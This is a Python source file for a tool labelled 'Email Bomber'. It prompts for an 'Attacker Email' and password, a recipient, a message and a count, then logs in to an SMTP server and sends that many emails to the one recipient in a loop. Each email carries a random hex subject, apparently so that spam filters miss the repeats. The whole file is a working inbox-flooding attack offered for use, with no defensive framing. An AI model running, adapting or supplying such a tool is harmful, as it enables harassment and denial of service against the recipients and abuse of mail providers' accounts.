from getpass import getpass
from time import sleep
import sys
import os
import smtplib
from email.mime.text import MIMEText
import secrets
import platform
from rich.progress import track
from rich import print

if platform.system() == 'Windows':
    os.system('cls')
else:
    os.system('clear')


def mail():
    print('[bold red]--------------------------------------------------------------------[bold red]')
    print('[bold red]*                                                                  *[bold red]')
    print('[bold red]*                                                                  *[bold red]')
    print('[bold red]*               ______                   _                         *[/bold red]')
    print('[bold red]*              |  ____|               (_) |                        *[/bold red]')
    print('[bold red]*              | |__   _ __ ___   __ _ _| |                        *[/bold red]')
    print("[bold red]*              |  __| | '_ ` _ \ / _` | | |                        *[/bold red]")
    print('[bold red]*              | |____| | | | | | (_| | | |                        *[/bold red]')
    print('[bold red]*              |______|_| |_| |_|\__,_|_|_|                        *[/bold red]')
    print('[bold red]*               ____                  _                            *[/bold red]')
    print('[bold red]*              |  _ \                | |                           *[/bold red]')
    print('[bold red]*              | |_) | ___  _ __ ___ | |__   ___ _ __              *[/bold red]')
    print("[bold red]*              |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|             *[/bold red]")
    print('[bold red]*              | |_) | (_) | | | | | | |_) |  __/ |                *[/bold red]')
    print('[bold red]*              |____/ \___/|_| |_| |_|_.__/ \___|_|                *[/bold red]')
    print('[bold red]*                                                                  *[/bold red]')
    print('[bold red]--------------------------------------------------------------------[/bold red]')
    print('\n\n')

    user = input('Name: ')
    email = input('\nAttacker Email: ')
    password = getpass('\nAttacker Password: ')
    to = input('\nRecipient Email: ')
    # subject = input('\nSubject: ')
    mssg = MIMEText(input('\nMessage: '))
    number = input('\nNumber of Emails: ')
    smtp = input('\nSMTP Server (smtp.(your_input).com): ')
    port = input('\nPort: ')
    stmp = 'smtp.' + smtp + '.com'

    try:
        server = smtplib.SMTP(stmp, port)
        server.ehlo()
        server.starttls()
        server.login(email, password)
        for i in track(range(1, int(number)+1), description="[red]Bombing..."):
            subject = secrets.token_hex(5)
            msg = f'From: {user}\nSubject: {subject}\nMessage: {mssg}'
            server.sendmail(email, to, msg)
            print("[red]\rE-mails sent: %i" % i)
            sleep(1)
            sys.stdout.flush()
        server.quit()
        print('[red]\nEmails have been sent!')
        sys.exit()

    except KeyboardInterrupt:
        print('\n[-] Canceled')
        sys.exit()

    except smtplib.SMTPAuthenticationError:
        print('\n[!] The username or password you entered was not accepted')
        sys.exit()

    except smtplib.SMTPConnectError:
        print("\n[!] Couldn't connect to the SMTP server")
        sys.exit()
